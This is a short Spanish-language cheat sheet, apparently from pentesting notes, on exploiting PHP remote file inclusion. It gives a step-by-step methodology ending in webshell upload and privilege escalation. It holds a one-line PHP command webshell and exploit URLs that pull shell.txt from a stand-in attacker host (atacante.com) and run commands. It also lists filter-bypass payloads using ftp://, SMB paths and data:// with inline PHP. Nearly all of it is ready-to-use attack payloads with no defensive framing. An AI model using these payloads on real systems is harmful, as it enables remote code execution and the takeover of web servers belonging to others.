

### Metodología

1. **Verificar si permite URL externas**: Probar con `?file=http://google.com`
2. **Confirmar ejecución de código**: Crear shell simple en servidor controlado
3. **Bypassear filtros**: Usar diferentes protocolos (ftp://, data://)
4. **Establecer shell**: Cargar webshell  para obtener RCE
5. **Post-explotación**: Enumerar sistema y escalar privilegios

### Inclusión remota básica

```ruby
http://ejemplo.com/page.php?file=http://atacante.com/shell.txt
```


***Requisitos***

- `allow_url_include = On` en PHP
- `allow_url_fopen = On` en PHP


### Shell remoto simple

***Archivo en `ejemplo.com/shell.txt`***

```php
<?php system($_GET['cmd']); ?>
```


***Explotación***

```ruby
http://ejemplo.com/page.php?file=http://atacante.com/shell.txt&cmd=whoami
```


### Bypass con protocolos

```ruby
# Usando FTP
http://ejemplo.com/page.php?file=ftp://atacante.com/shell.txt

# Usando SMB (Windows)
http://ejemplo.com/page.php?file=\\atacante.com\share\shell.txt

# Usando data://
http://ejemplo.com/page.php?file=data://text/plain,<?php system($_GET['cmd']); ?>
```

